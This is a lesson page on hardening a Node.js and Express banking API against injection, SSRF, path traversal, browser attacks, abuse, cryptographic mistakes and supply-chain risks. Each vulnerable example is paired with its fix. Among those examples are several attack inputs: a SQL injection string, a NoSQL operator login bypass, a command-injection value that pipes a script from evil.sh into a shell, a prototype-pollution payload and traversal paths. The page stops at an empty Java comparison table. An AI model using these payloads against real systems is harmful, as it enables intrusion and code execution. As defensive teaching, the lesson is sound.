---
title: Securing Node.js services — input validation, injection, SSRF, browser attacks, abuse, secrets and supply chain
nav: Node.js security
slug: node-security
summary: Securing a Node.js and Express API beyond login, the OWASP Top 10 mapped to Node, trust boundaries and defence in depth, strict input validation with schemas and query string parser pitfalls, SQL and NoSQL operator injection and command injection and log injection, mass assignment and prototype pollution, server-side request forgery with private address checks, path traversal and file uploads, XSS and Content Security Policy and helmet and CORS and CSRF, denial of service with body limits and timeouts and rate limiting and ReDoS, cryptography with randomBytes and timingSafeEqual and AES-256-GCM, protecting sensitive data and redacting logs and safe errors, supply chain risks with lockfiles and audit and install scripts, runtime hardening and the permission model, security testing with SAST and DAST and secret scanning, compared with Spring Security and the JVM, with banking examples and interview questions.
tags: [Node.js, Security, OWASP, Injection, SSRF, XSS, CORS, Validation, Supply chain, Backend, Full stack]
order: 76
topic: Full stack / Node.js
updated: 2026-11-20
subnav: true
---

Security questions in a Node.js interview are about habits more than tools. They ask *how you validate input and why a schema beats ad hoc checks, what SQL injection and NoSQL operator injection look like and how you prevent them, what mass assignment and prototype pollution are, how SSRF works and how you stop it, how you keep path traversal and command injection out, how helmet, CSP, CORS and CSRF protections fit together, how you limit abuse and denial of service, how you encrypt and compare secrets correctly, what you never log, and how you deal with dependencies you did not write.* Login, sessions and tokens are in [Node.js authentication](lesson:node-authentication#basics), so this lesson covers everything around them. It builds on [authorisation layers](lesson:node-express-middleware#auth), [JWT](lesson:jwt#validation), [cryptography](lesson:cryptography#practice) and the [full-stack security checklist](lesson:fullstack-integration#security). Examples use a banking transfer service. Play the four scenes: never trust input, server-side requests and files, protect the browser, and defence in depth.

```demo
name: node-security-walk
```

> **One sentence to remember:** *Treat every byte from outside as hostile: validate it against a strict schema at the edge, keep data and code apart (parameters, argument arrays, encoding), authorise every object, limit what any caller can cost you, keep secrets and sensitive data out of code and logs, and assume dependencies and mistakes will happen by layering defences and watching for them.*

## Thinking about security {#mindset}

A secure design starts with **where trust changes**. A **trust boundary** is any place where data or control crosses from something you do not control to something you do: a browser, a mobile app, another company's webhook, a file upload, even another internal service (it can be compromised too). Every boundary needs **validation** (is it well formed?), **authentication** (who is it?) and **authorisation** (may they do this to this object?).

Principles that answer most interview questions:

- **Defence in depth**: several independent layers (validation, parameterised queries, least-privilege database user, network policies, monitoring), so one mistake is not a breach.
- **Least privilege**: the process, the database user and the cloud role get only what they need.
- **Fail closed and fail safely**: on an error deny access, and do not leak details.
- **Secure defaults and simplicity**: the safe option is the default, and less code and fewer dependencies mean fewer bugs.
- **Never trust the client**: hiding a button is not authorisation. The server decides.
- **Complete mediation**: check every request, not only the first one.

The **OWASP Top 10** is the common checklist (the 2021 edition is widely cited, so check the current version), here mapped to a Node API:

| OWASP category | In Node terms | Where |
| --- | --- | --- |
| **Broken access control** | missing ownership check (IDOR), role checks in the client only | [authorisation](lesson:node-express-middleware#auth), [below](#data) |
| **Cryptographic failures** | `Math.random` for tokens, weak hashes, secrets in code, no TLS | [crypto](#crypto) |
| **Injection** | SQL, NoSQL operators, OS commands, template and log injection, XSS | [injection](#injection), [browser](#browser) |
| **Insecure design** | no limits on transfers, no step-up, no abuse cases | [mindset](#mindset), [abuse](#abuse) |
| **Security misconfiguration** | debug mode, stack traces, default CORS `*`, open ports | [browser](#browser), [runtime](#runtime) |
| **Vulnerable and outdated components** | old packages, typosquats, install scripts | [supply chain](#supply) |
| **Identification and authentication failures** | weak passwords, no MFA, long-lived tokens | [authentication](lesson:node-authentication#login) |
| **Software and data integrity failures** | unsigned images, untrusted deserialisation, CI compromise | [supply chain](#supply) |
| **Logging and monitoring failures** | no audit log, secrets in logs | [data](#data) |
| **Server-side request forgery** | fetching user URLs from inside the network | [SSRF](#ssrf) |

A quick way to find problems before writing code is **threat modelling**: draw the data flow, mark the trust boundaries, and for each flow ask the **STRIDE** questions (spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege). It is cheap and finds design flaws that no scanner can.

## Validate input at the edge {#input}

Anything that arrives in `req.body`, `req.query`, `req.params`, `req.headers`, cookies, uploaded files and messages from queues is untrusted. The rules:

1. **Validate once, at the edge**, with a **schema** (zod, ajv, valibot, TypeBox), before the data reaches business code. Ad hoc `if` checks scattered through handlers get forgotten.
2. **Allow-list, do not deny-list**: define what is valid (type, length, format, range, enumeration) instead of trying to list what is bad.
3. **Be strict**: wrong type is a 400 or 422, unknown keys are rejected, numbers have bounds, strings have maximum lengths.
4. **Build a new object** from the validated result. Never pass `req.body` through.
5. **Validate on the server even if the browser validates too.** Client-side validation is for usability only.
6. **Normalise** where it matters (Unicode normalisation, trimming, case for emails) and strip control characters from text that will be logged or shown.
7. Validate **types as well as shapes**. A query string can arrive as an array or an object: with the `qs` parser that Express 4 uses, `?id[]=1&id[]=2` is an array and `?id[$ne]=x` becomes `{ $ne: 'x' }`. Express 5 uses a simpler parser by default, but the schema must still insist on a string.

A strict validator for a transfer request, written without a library so the checks are visible (zod or ajv express the same from a schema):

```javascript
export class ValidationError extends Error {
  constructor(issues) {
    super('Validation failed');
    this.name = 'ValidationError';
    this.status = 422;
    this.issues = issues;
  }
}

export function parseTransfer(input) {
  const issues = [];
  if (input === null || typeof input !== 'object' || Array.isArray(input)) {
    throw new ValidationError([{ path: '', message: 'body must be an object' }]);
  }

  const allowed = new Set(['from', 'to', 'amount', 'currency', 'reference']);
  for (const key of Object.keys(input)) {
    if (!allowed.has(key)) issues.push({ path: key, message: 'unknown field' });      // blocks mass assignment
  }

  const id = (name) => {
    const v = input[name];
    if (typeof v !== 'string' || !/^[A-Z0-9]{8,12}$/.test(v)) issues.push({ path: name, message: 'must be an account id' });
    return v;
  };
  const from = id('from');
  const to = id('to');
  if (from !== undefined && from === to) issues.push({ path: 'to', message: 'must differ from from' });

  const amount = input.amount;
  if (!Number.isInteger(amount) || amount <= 0 || amount > 10_000_000) {              // integer cents, with an upper bound
    issues.push({ path: 'amount', message: 'must be a positive integer number of cents, at most 10000000' });
  }
  if (!['SGD', 'USD', 'EUR'].includes(input.currency)) issues.push({ path: 'currency', message: 'unsupported currency' });

  let reference = input.reference;
  if (reference !== undefined) {
    if (typeof reference !== 'string' || reference.length > 140) {
      issues.push({ path: 'reference', message: 'must be text up to 140 characters' });
    } else {
      reference = reference.normalize('NFC').replace(/[\u0000-\u001f\u007f]/g, ' ').trim();   // strip control characters
    }
  }

  if (issues.length) throw new ValidationError(issues);
  return { from, to, amount, currency: input.currency, ...(reference ? { reference } : {}) };   // a new object
}
```

I ran this with `node:test`: a good request produces a clean object, and `role: 'admin'`, a string amount, a negative amount, `from: { $ne: null }`, an array body and a JSON body with `__proto__` are all rejected, with every issue reported together. Return validation errors as a **consistent error format** (422 with a list of issues) and do **not** echo hostile input into the message unescaped.

Also limit the size of everything: `express.json({ limit: '100kb' })`, a maximum number of items in arrays, a maximum page size, and a maximum upload size ([abuse](#abuse)).

## Injection {#injection}

**Injection** happens when untrusted data is interpreted as code or as a command by another system. The cure is always the same: **keep data and code apart**, so that data can never become code.

### SQL injection

```javascript
// vulnerable: the value becomes part of the SQL text
const { rows } = await pool.query(`SELECT * FROM accounts WHERE owner = '${req.query.owner}'`);
// ?owner=' OR '1'='1   returns every account

// safe: SQL and values travel separately, the driver never mixes them
const { rows } = await pool.query('SELECT * FROM accounts WHERE owner = $1', [req.query.owner]);
```

- **Always use parameters** (`$1`, `?`, named parameters), including in ORMs and query builders (their `raw` or `sql` escape hatches need the same care).
- Things that **cannot be parameters** (table and column names, `ORDER BY` direction, `LIMIT` sometimes) must be **allow-listed**: `const column = { date: 'created_at', amount: 'amount' }[req.query.sort] ?? 'created_at'`.
- `LIKE` patterns need the `%` and `_` characters in user text escaped.
- Use a **least-privilege database user** so injection that slips through cannot drop tables or read other schemas. Do not connect as the owner or a superuser.
- Escaping functions are a last resort. Parameters are the control.

### NoSQL operator injection

A MongoDB-style query takes JSON, so a **JSON body can inject operators**:

```javascript
// POST /login  { "email": "alice@bank.example", "password": { "$ne": null } }
const user = await users.findOne({ email: req.body.email, password: req.body.password });
// the password condition becomes "not null": always true, so the login succeeds
```

Cure: validate that `email` and `password` are **strings** (a schema does this), never pass request objects into queries, hash passwords instead of comparing them in the query, and consider sanitising keys that start with `$` (`express-mongo-sanitize`). The same type confusion applies to any query built from `req.body`.

### OS command injection

```javascript
import { exec, execFile } from 'node:child_process';

exec(`convert ${req.query.file} out.png`);                       // a shell parses the string: "a.png; curl evil.sh | sh" runs
execFile('convert', [file, 'out.png']);                          // no shell: the text stays one argument
```

I ran both with the input `hello && echo INJECTED`: `exec` printed `INJECTED` (the shell ran the second command), while `execFile` printed the text unchanged as a single argument. Rules: prefer a **library** to spawning programs, use `execFile` or `spawn` with an **argument array** and `shell: false` (the default), validate the argument against an allow-list (and reject values starting with `-` that a program would read as an option, or put `--` before them), and run with minimal privileges. Never use `eval`, `new Function`, `vm` (it is **not** a security sandbox) or a template engine on user-controlled template text.

### Other injection forms

- **Log injection**: user text with newlines forges log lines (`\n2026-11-20 INFO admin logged in`). Log **structured JSON** (pino) with the user text as a field, so it is escaped, and strip control characters.
- **Header injection** (CRLF): never put raw user text into a header value or a redirect URL. Node rejects invalid characters in header values, but validate anyway.
- **Template injection**: do not build templates from user input, and let the engine escape variables by default.
- **LDAP, XPath, GraphQL and email injection**: the same idea, with parameterisation or encoding for each target. For GraphQL also limit **query depth and cost**.
- **Open redirect**: `res.redirect(req.query.next)` sends users to a phishing site from your domain. Allow-list the targets or accept only relative paths.

## Mass assignment and prototype pollution {#objects}

**Mass assignment** copies a whole request body into a model or an update, so a caller can set fields you never meant to expose:

```javascript
await db.accounts.update(id, { ...req.body });        // body: { "nickname": "x", "role": "admin", "limit": 99999999 }
```

Reject unknown keys and **pick allowed fields** explicitly (see the validator above), and keep separate input types for create and update, with server-controlled fields (`id`, `owner`, `role`, `balance`) never accepted from the client. In TypeScript the types do **not** protect you, because they are erased at runtime. Validate at runtime.

**Prototype pollution** abuses the fact that JavaScript objects inherit from `Object.prototype`. A recursive merge that follows the key `__proto__` (or `constructor.prototype`) writes onto the shared prototype, so **every** object in the process changes:

```javascript
function unsafeMerge(target, src) {
  for (const k in src) {
    if (typeof src[k] === 'object' && src[k] !== null) { target[k] ??= {}; unsafeMerge(target[k], src[k]); }
    else target[k] = src[k];
  }
  return target;
}
unsafeMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
({}).isAdmin;        // true: every object now has isAdmin
```

`JSON.parse` itself is safe, because it creates `__proto__` as an ordinary own property. The danger is the **merge, clone or path-set** code that then follows it (`lodash.merge`, `set(obj, path, value)` with user paths, hand-written deep copies). The same test showed this: after the unsafe merge `({}).isAdmin` was `true`, and after the safe merge below it stayed `undefined`.

```javascript
const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, src) {
  for (const k of Object.keys(src)) {
    if (FORBIDDEN.has(k)) continue;                                           // never follow these keys
    if (typeof src[k] === 'object' && src[k] !== null && !Array.isArray(src[k])) {
      if (!Object.hasOwn(target, k)) target[k] = {};                          // own properties only
      safeMerge(target[k], src[k]);
    } else target[k] = src[k];
  }
  return target;
}
```

Other defences: use a `Map` or `Object.create(null)` for dictionaries keyed by user text, `structuredClone` for copying, a schema that rejects unknown keys, `Object.freeze(Object.prototype)` in tests, up-to-date libraries, and `node --disable-proto=delete` to remove `__proto__` altogether.

## Server-side requests: SSRF {#ssrf}

**Server-side request forgery** makes your server send a request the attacker chooses. Webhook URLs, "import from URL", image fetchers and PDF renderers are the usual entry. From inside your network the attacker can reach services that the internet cannot: admin consoles, databases, and above all the **cloud metadata service** (`http://169.254.169.254/...`), which can hand out the credentials of the machine's role.

Defences, in order of strength:

1. **Do not fetch user URLs.** If you must, accept only **allow-listed hosts** (`api.partner.example`).
2. Allow only `https:` (and `http:` if needed), no credentials in the URL, and no unusual ports.
3. **Resolve the name and reject private addresses**: loopback (`127.0.0.0/8`, `::1`), private ranges (`10/8`, `172.16/12`, `192.168/16`), link-local (`169.254/16`, `fe80::/10`), unique local IPv6 (`fc00::/7`), carrier-grade NAT, and IPv4-mapped IPv6.
4. **Do not follow redirects automatically** (`redirect: 'error'` or check each hop), because a public URL can redirect to an internal one.
5. Set **timeouts and a maximum response size**, and do not return the fetched body to the caller verbatim.
6. **Network controls**: egress rules so the service cannot reach the metadata endpoint or internal ranges anyway, and the **IMDSv2** requirement on AWS (a session token header that a simple SSRF cannot add).

```javascript
import { lookup } from 'node:dns/promises';
import net from 'node:net';

export function isPrivateAddress(ip) {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split('.').map(Number);
    return a === 10 || a === 127 || a === 0
      || (a === 172 && b >= 16 && b <= 31)
      || (a === 192 && b === 168)
      || (a === 169 && b === 254)                                 // cloud metadata service
      || (a === 100 && b >= 64 && b <= 127);                      // carrier-grade NAT
  }
  if (net.isIPv6(ip)) {
    const v = ip.toLowerCase();
    if (v.startsWith('::ffff:')) return isPrivateAddress(v.slice(7));         // IPv4-mapped address
    return v === '::1' || v === '::' || v.startsWith('fc') || v.startsWith('fd')
      || v.startsWith('fe8') || v.startsWith('fe9') || v.startsWith('fea') || v.startsWith('feb');
  }
  return true;                                                                 // not an IP address: refuse
}

export async function assertPublicHttpUrl(raw, { allowedHosts } = {}) {
  const url = new URL(raw);
  if (!['https:', 'http:'].includes(url.protocol)) throw new Error('only http and https');
  if (url.username || url.password) throw new Error('credentials in the URL are not allowed');
  if (allowedHosts && !allowedHosts.includes(url.hostname)) throw new Error('host not allowed');

  const addresses = await lookup(url.hostname, { all: true });                 // every address the name resolves to
  if (addresses.length === 0 || addresses.some((a) => isPrivateAddress(a.address))) throw new Error('address not allowed');
  return url;
}

const url = await assertPublicHttpUrl(req.body.callbackUrl, { allowedHosts: partnerHosts });
const res = await fetch(url, { redirect: 'error', signal: AbortSignal.timeout(3000) });
```

I tested this: `localhost`, `169.254.169.254`, `10.x`, `fd00::1`, `::ffff:127.0.0.1` and `file:///etc/passwd` are rejected, a URL with credentials is rejected, a host outside the allow-list is rejected, and a public address passes. One subtle gap remains: **DNS rebinding**. The name can resolve to a public address during the check and to a private one when `fetch` resolves it again. The strongest fix is to **connect to the address you checked** (a custom `lookup` function in the HTTP agent that performs the check), or to rely on egress network rules.

## Files, paths and uploads {#files}

**Path traversal**: a file name such as `../../etc/passwd` climbs out of the folder you meant to serve. Never open `path.join(baseDir, userInput)` without checking the result:

```javascript
import path from 'node:path';

export function safeJoin(baseDir, userPath) {
  if (typeof userPath !== 'string' || userPath.includes('\0')) throw new Error('invalid path');
  const base = path.resolve(baseDir);
  const target = path.resolve(base, userPath);                // resolves .. and absolute paths
  const rel = path.relative(base, target);
  if (rel === '' || rel.startsWith('..') || path.isAbsolute(rel)) throw new Error('path escapes the base directory');
  return target;
}
```

I tested this against `../secret.txt`, `..\..\x`, `../../etc/passwd`, `a/../../b`, an absolute path, an empty path and a path with a null byte: all throw, and `2026/11/a.pdf` is accepted. Better still, **do not use user text as a path at all**: store files under generated ids (a UUID) and look the name up in the database. If symbolic links are possible, also check `fs.realpath` of the result. `express.static` handles traversal and ignores dotfiles by default, so use it for static content instead of writing your own. **Zip slip** is the same problem inside archives: check every entry name before extracting.

**Uploads** (statements, ID documents) need their own rules:

- A **maximum size** and number of files (multer `limits`, a streaming parser), and a request timeout.
- Check the **content**, not the file name or the `Content-Type` header: look at the magic bytes, allow only the types you expect, and re-encode images.
- Store files **outside the web root** under a **random name**, with private object storage (S3) and short-lived signed URLs for download. Serve with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
- **Scan** for malware where the risk justifies it, and never execute or `require` uploaded content.

## Protecting the browser: XSS, CSP, CORS and CSRF {#browser}

Most of these are front-end issues, but the API sets the headers and the cookies, so a Node developer must know them.

**Cross-site scripting (XSS)**: attacker text runs as script in a victim's browser, so it can read pages and act as the user.

- **Encode output** for its context (HTML, attribute, URL, JavaScript, CSS). React escapes text by default. The dangers are `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, building HTML strings on the server, and putting JSON inside a `<script>` tag without escaping `<`.
- **Sanitise rich text** that you must allow with a maintained library (DOMPurify, `sanitize-html`) on a strict allow-list. Never write your own regular expression sanitiser.
- A strict **Content Security Policy** limits what an injected script can do (see below).
- Keep tokens out of JavaScript's reach: `HttpOnly` cookies ([authentication](lesson:node-authentication#sessions)).

**helmet** sets a sensible group of headers in one call:

```javascript
import helmet from 'helmet';

app.disable('x-powered-by');                      // do not advertise the framework
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],                       // no inline scripts, no third-party scripts unless listed
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],                  // nobody may frame the app (clickjacking)
      baseUri: ["'self'"],
    },
  },
  hsts: { maxAge: 31_536_000, includeSubDomains: true },   // browsers use HTTPS only
}));
```

Other headers helmet sets: `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy`. For a JSON API a tight `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` is enough, and the real CSP matters on the server that serves the HTML (the front end's host or CDN). Roll a new CSP out in `Content-Security-Policy-Report-Only` mode first.

**CORS** tells browsers which other origins may read your API's responses. It is **not** an authentication mechanism and does not stop a request from being sent, only from being read ([CORS in Express](lesson:node-express-middleware#common)). Rules:

- Use an **allow-list of exact origins**. Never reflect the `Origin` header blindly, and never combine `Access-Control-Allow-Origin: *` with credentials (browsers refuse, and reflecting any origin with credentials is a vulnerability).
- Match origins **exactly**: `origin.endsWith('bank.example')` also matches `evilbank.example`, and a loose regular expression has the same flaw.
- Treat the `null` origin (sandboxed iframes, `file:`) as untrusted.
- Allow only the methods and headers you need, and keep `Access-Control-Max-Age` modest.

**CSRF**: with cookie authentication the browser attaches the cookie to a request from any site, so a hostile page can submit a form to your transfer endpoint. Defences: `SameSite=Lax` or `Strict` cookies, an **anti-CSRF token** or a custom request header (a cross-site form cannot add one without a CORS preflight that you refuse), checking `Origin` and `Sec-Fetch-Site` on state-changing requests, and never changing state with `GET`. Bearer tokens in an `Authorization` header are not sent automatically, so they are not CSRF-prone but must be stored carefully ([session or token](lesson:node-authentication#attacks)).

## Abuse and denial of service {#abuse}

Some requests are hostile and others are just expensive. The goal is that **no single caller can cost more than their share**:

| Risk | Control |
| --- | --- |
| huge bodies and uploads | `express.json({ limit })`, upload limits, reject early with 413 |
| slow connections (slowloris) | server timeouts: `headersTimeout`, `requestTimeout`, `keepAliveTimeout`, `maxHeadersCount`, plus the proxy's limits |
| too many requests | **rate limiting** per user, per API key and per address (and stricter on login, reset and OTP endpoints) |
| expensive queries | maximum page size, bounded filters, query timeouts (`statement_timeout`), GraphQL depth and cost limits |
| event loop blocking | no sync work in handlers, **ReDoS**-safe patterns, worker threads ([performance](lesson:node-performance#loop)) |
| decompression and parsing bombs | limit the decompressed size, depth and number of keys |
| hashing as a weapon | limit login attempts, run password hashing off the main thread |
| resource exhaustion | connection and concurrency limits, timeouts on every outbound call, load shedding ([shedding](lesson:node-performance#shedding)) |

A rate limiter with a shared store, so every instance sees the same counters:

```javascript
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

app.set('trust proxy', 1);                                   // so the real client address is used, not the proxy's

const apiLimiter = rateLimit({
  windowMs: 60_000, limit: 120,                              // 120 requests per minute
  standardHeaders: 'draft-7', legacyHeaders: false,
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
  keyGenerator: (req) => req.user?.id ?? req.ip,             // per user once authenticated, per address before
});
const loginLimiter = rateLimit({ windowMs: 15 * 60_000, limit: 10, store, keyGenerator: (req) => `${req.ip}:${req.body?.email}` });

app.use('/api', apiLimiter);
app.post('/login', loginLimiter, loginHandler);
```

An in-memory limiter works only for a single process, so use Redis (or the gateway's limiter) when you run several pods. Respond with `429` and `Retry-After`.

**ReDoS**: a regular expression with nested quantifiers backtracks exponentially on crafted input. I measured `/^(a+)+$/` against `'a'` repeated n times followed by `b`: 54 ms at n = 20, 601 ms at n = 26, and about **3 seconds at n = 28**, during which the process serves nobody, while the linear pattern `/^a+$/` took 2 ms on a million characters. Avoid nested or overlapping quantifiers, limit the input length before matching, prefer parsers to regular expressions for structured data, and use a linear-time engine such as `re2` for user-supplied patterns.

## Cryptography and secrets in code {#crypto}

Most mistakes are **using the right primitive wrongly**. Use `node:crypto` and well-known libraries, never your own scheme ([cryptography in practice](lesson:cryptography#practice)).

- **Randomness for secrets**: `crypto.randomBytes`, `crypto.randomUUID`, `crypto.randomInt`. **Never `Math.random()`** for tokens, ids that must not be guessed, reset codes or session ids.
- **Compare secrets in constant time**: `crypto.timingSafeEqual` on equal-length buffers (check the length first), so response time does not reveal how many characters matched (see the helper in [authentication](lesson:node-authentication#login)).
- **Passwords**: argon2id, scrypt or bcrypt, never a fast hash ([passwords](lesson:node-authentication#passwords)). **Data integrity and webhook signatures**: HMAC-SHA-256 with a secret, compared in constant time, plus a timestamp to stop replays.
- **Encrypting data**: use an **authenticated** mode, **AES-256-GCM**, with a fresh random 12-byte IV for every message and the tag checked on decryption. Never ECB, never a reused IV, never encryption without authentication, never a home-made algorithm.
- **Keys**: generated with `randomBytes(32)`, stored in a KMS or secret manager, never in the code, rotated, and used through **envelope encryption** for bulk data (a data key encrypted by a master key in the KMS).
- **TLS**: terminate with a current protocol version, and never set `rejectUnauthorized: false` or `NODE_TLS_REJECT_UNAUTHORIZED=0` to silence a certificate error. That turns off the check and allows a man-in-the-middle.

```javascript
import { createCipheriv, createDecipheriv, randomBytes } from 'node:crypto';

export function encrypt(plaintext, key, aad = '') {
  if (key.length !== 32) throw new Error('key must be 32 bytes');
  const iv = randomBytes(12);                                         // unique for every message under one key
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  if (aad) cipher.setAAD(Buffer.from(aad));                           // bound to the message but not encrypted, e.g. the account id
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  return Buffer.concat([iv, cipher.getAuthTag(), ciphertext]).toString('base64url');   // iv | tag (16 bytes) | ciphertext
}

export function decrypt(token, key, aad = '') {
  const raw = Buffer.from(token, 'base64url');
  if (raw.length < 28) throw new Error('invalid token');
  const decipher = createDecipheriv('aes-256-gcm', key, raw.subarray(0, 12));
  decipher.setAuthTag(raw.subarray(12, 28));
  if (aad) decipher.setAAD(Buffer.from(aad));
  return Buffer.concat([decipher.update(raw.subarray(28)), decipher.final()]).toString('utf8');   // final() throws if anything changed
}
```

I tested this: a round trip returns the original text, two encryptions of the same text differ (fresh IV), and decryption throws for a wrong key, a wrong associated-data value and a single flipped bit. In production the key comes from a KMS, and bulk data uses a data key that the KMS has encrypted.

**Secrets handling**: no secrets in Git, images, build arguments, URLs, client bundles (`VITE_*` variables are public), or logs. Run **secret scanning** (gitleaks, GitHub secret scanning) in the pipeline and as a pre-commit hook, and **rotate** anything that leaked, because removing it from history does not make it secret again ([configuration and secrets](lesson:node-deployment#config)).

## Sensitive data, logging and errors {#data}

- **Classify data**: card numbers (PAN), national ID numbers, account numbers, and personal data (covered by Singapore's PDPA and similar laws) need extra care. A bank also follows PCI DSS for cards and its regulator's technology risk guidelines. Do not collect or keep what you do not need, and do **not store** the card verification value at all.
- **Encrypt** sensitive fields at rest (database and disk encryption, plus field-level AES-GCM for the most sensitive), and use TLS everywhere in transit, also inside the network.
- **Mask and redact**: show only the last four digits, and keep sensitive fields out of logs, error reports, analytics and URLs (query strings end up in access logs). With pino, `redact` removes paths from log lines.

```javascript
import pino from 'pino';

export const logger = pino({
  redact: { paths: ['req.headers.authorization', 'req.headers.cookie', '*.password', '*.cardNumber', '*.token'], censor: '[redacted]' },
});

// a defensive mask for free text that might contain a card number
export const maskPan = (s) => String(s).replace(/\b(\d{4})[ -]?(\d{4,8})[ -]?(\d{4})[ -]?(\d{0,4})\b/g, (m) => m.replace(/\d(?=(?:[ -]?\d){4})/g, '*'));
maskPan('card 4111 1111 1111 1111 ok');      // 'card **** **** **** 1111 ok'
```

- **Errors**: return a generic message and a **correlation id** to the client, and keep the details and stack trace in the logs. In production never send `err.stack`, SQL text, file paths or library versions (set `NODE_ENV=production`, use a central error handler, see [error handling](lesson:node-express-middleware#errors)). Return the same response for "not found" and "not yours" when existence is itself secret.
- **Authorisation on every object** (broken object-level authorisation, **IDOR**): `GET /accounts/:id` must check that the caller owns or may see **that** account, not only that they are logged in. Put the check in the service next to the data access, and add a test that user B gets 403 or 404 for user A's account. Predictable ids (1, 2, 3) make guessing easy, but they are not the fix.
- **Least-privilege data access**: separate database users for the application, migrations and reporting, row-level security where it fits, and no shared admin credentials.
- **Audit log** for sign-ins, authorisation failures, changes to payees and limits, and every money movement: who, what, when, from where, and the outcome, in an append-only store, without secrets. See [observability](lesson:fullstack-integration#observability).
- **Retention**: delete data you no longer need, and make backups encrypted and access-controlled.

## The supply chain {#supply}

A typical Node service contains hundreds of transitive packages. That is where many real breaches happen: **typosquatting** (`expresss`), a **hijacked maintainer account** or a malicious update, **dependency confusion** (a private package name taken on the public registry), and **install scripts** that run code on `install`.

- **Lockfile committed and a frozen install** (`pnpm install --frozen-lockfile`) so the build uses exactly the reviewed versions.
- **Audit**: `pnpm audit --prod` in CI, an alert on new advisories, and **automated update pull requests** (Renovate, Dependabot) that go through review and tests. Recent pnpm versions do not run dependency install scripts unless you allow-list them, which blocks a whole class of attacks. With other tools use `--ignore-scripts` and enable scripts only where needed.
- **Choose dependencies carefully**: maintained, widely used, small. Replace a trivial package with a few lines of your own. Check new packages by name, publisher and download history.
- **Private registry or proxy** with an allow-list, and scoped package names (`@bank/...`) registered on the public registry to prevent confusion.
- **Provenance and signing**: npm provenance for packages you publish, signed container images, **SBOM** generation, and pinning GitHub Actions to a commit SHA, because a CI action runs with your secrets.
- **Protect the pipeline**: least-privilege CI tokens, no long-lived cloud keys (use OIDC federation), protected branches and required reviews, and separate build and deploy permissions.
- **Know where each package runs**: a vulnerability only in a dev dependency is far less urgent than one in a production request path. Have a process to update fast when a critical advisory appears.

## Runtime hardening {#runtime}

- **Container and process**: non-root user, read-only filesystem, no extra capabilities, minimal image ([Docker image security](lesson:docker#security), [deployment](lesson:node-deployment#docker)).
- **`NODE_ENV=production`**, no debug endpoints or `--inspect` exposed (the inspector gives remote code execution), no `/metrics` or `/health` details on the public ingress.
- **Node's permission model** in recent versions (`node --permission --allow-fs-read=/app`) restricts file system, child process and worker access of a process. Useful as an extra layer, but not a substitute for the controls above.
- **Network**: Kubernetes NetworkPolicies (default deny), egress restrictions, private subnets for databases, TLS between services, and a WAF in front of public APIs.
- **Process errors**: log and exit on `uncaughtException` and `unhandledRejection` and let the orchestrator restart, rather than running in an unknown state.
- **Do not trust `vm`, `eval`, `Function` or `require` of user-influenced paths**, and be cautious with `JSON` reviver functions, `yaml` loaders that allow custom types, and deserialisers that can instantiate arbitrary classes (the same class of problem as Java deserialisation).
- **Keep Node and the OS patched**: run a supported LTS version, and rebuild images regularly.

## Security testing and process {#testing}

| Technique | Finds | Example tools |
| --- | --- | --- |
| **SAST** (static analysis) | injection patterns, unsafe APIs, hard-coded secrets | CodeQL, Semgrep, `eslint-plugin-security` |
| **dependency scanning** | known vulnerable packages | `pnpm audit`, Dependabot, Snyk, OSV |
| **secret scanning** | leaked keys and tokens | gitleaks, GitHub secret scanning |
| **container scanning** | vulnerable OS packages in the image | Trivy, Grype |
| **DAST** (running app) | missing headers, injection, misconfiguration | OWASP ZAP |
| **unit and integration tests for security rules** | IDOR, validation, rate limits, error format | `node:test`, supertest ([testing](lesson:node-testing#http)) |
| **fuzzing and property tests** | crashes and edge cases in parsers | fast-check |
| **penetration test** and **bug bounty** | logic flaws and chained issues | external testers |
| **threat modelling and design review** | design flaws | STRIDE sessions |

Write **abuse-case tests** next to the happy path: user B cannot read user A's account (403 or 404), a body with `role: 'admin'` is rejected, a path with `..` is rejected, the 121st request in a minute gets 429, an expired or tampered token fails. Make security checks **pipeline gates**, and agree on how quickly critical findings must be fixed. Keep a short **incident response plan**: contain, rotate secrets, investigate with the audit log, notify (regulators and customers where required), and learn.

## Common mistakes {#mistakes}

| Mistake | Fix |
| --- | --- |
| trusting `req.body`, `req.query` and headers | a strict schema at the edge, build a new object |
| SQL built with template strings | parameters, allow-listed identifiers |
| passing `req.body` into a Mongo query | validate types, reject operator objects |
| `exec` with user text | `execFile` with an argument array, or a library |
| `{ ...req.body }` into an update | pick allowed fields, reject unknown keys |
| deep merge of untrusted JSON | skip `__proto__` and `constructor`, use `Map`, `hasOwn` |
| fetching user-supplied URLs freely | allow-list, private address check, no redirects, egress rules |
| `path.join(base, userInput)` | `path.resolve` and `path.relative` check, or generated ids |
| trusting file name and content type of uploads | magic bytes, random names, private storage |
| `dangerouslySetInnerHTML` or `innerHTML` with user text | encode, sanitise with DOMPurify |
| `Access-Control-Allow-Origin: *` with credentials, or reflecting the origin | exact allow-list |
| `endsWith` or a loose regular expression for origins | compare exact origins |
| no limits on size, rate or time | body limits, timeouts, rate limiting, page caps |
| nested quantifiers in regular expressions | linear patterns, input length limit, `re2` |
| `Math.random()` for tokens | `crypto.randomBytes`, `randomUUID` |
| `===` to compare secrets | `timingSafeEqual` |
| AES-CBC without authentication, ECB, reused IV | AES-256-GCM with a fresh IV |
| `rejectUnauthorized: false` | fix the certificate or trust the right CA |
| secrets and card numbers in logs and URLs | redaction, masking, no sensitive query parameters |
| stack traces in responses | generic message plus a correlation id |
| authorisation only at login, not per object | ownership check on every object |
| installing packages unreviewed, scripts enabled | lockfile, audit, script allow-list, reviewed updates |
| long-lived CI cloud keys, unpinned actions | OIDC federation, pin to a SHA |

## For a Java developer {#java}

| Spring and the JVM | Node.js |
| --- | --- |
